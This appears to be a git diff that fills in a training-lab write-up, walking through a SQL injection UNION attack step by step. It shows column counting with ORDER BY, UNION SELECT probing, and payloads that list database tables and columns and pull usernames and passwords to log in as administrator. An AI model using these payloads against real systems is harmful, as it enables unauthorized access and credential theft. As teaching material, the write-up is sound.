@@ -8,42 +8,110 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 
 ***
 
-hack
+Let's Start !!
+
+First We Visit The Website !!
 
 <figure><img src="../../../.gitbook/assets/image (542).png" alt=""><figcaption></figcaption></figure>
 
-hack
+We Try To Inject Single Quote `'` To Break The Backend Query !!
+
+Our Backend Query Is This Below !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets' 
+```
+
+When We Inject The Single Quote `'` Actually The Create Error In The SQL Query !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets''
+```
 
 <figure><img src="../../../.gitbook/assets/image (543).png" alt=""><figcaption></figcaption></figure>
 
-hack
+We Try To Inject `'--` To Check The Backend Query !!
+
+Our Backend Query Is This Below !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets' 
+```
+
+When We Inject `'--` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets'--'
+```
 
 <figure><img src="../../../.gitbook/assets/image (544).png" alt=""><figcaption></figcaption></figure>
 
-hack
+**Finding Number of Columns**
+
+**Method – ORDER BY**
+
+```
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+```
+
+If `ORDER BY 3` fails, query has 2 columns.
 
 <figure><img src="../../../.gitbook/assets/image (545).png" alt=""><figcaption></figcaption></figure>
 
-hack
+That `ORDER BY 3` fails, query has 2 columns.
+
+it's Mean We assume Right Backend Query They have only Two Columns First is `name` and Second is `description` !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets'
+```
 
 <figure><img src="../../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Let's We Use In Our Two Column Table !!
+
+```
+'UNION SELECT 'a','b'--
+```
+
+Our Backend Code Look's Like This After Injecting This Query !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets'
+UNION
+SELECT 'a','b'
+```
+
+Then See If Our First and Second Both Column is String They Return No Error !!
 
 <figure><img src="../../../.gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>
 
-hacker
+Use the following payload to retrieve the list of tables in the database:
+
+```
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+```
 
 <figure><img src="../../../.gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>
 
-hacker
+Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
+
+```
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+```
 
 <figure><img src="../../../.gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
+
+```
+' UNION SELECT username,password FROM users--
+```
 
 <figure><img src="../../../.gitbook/assets/image (550).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Find the password for the `administrator` user, and use it to log in.
 
 <figure><img src="../../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>
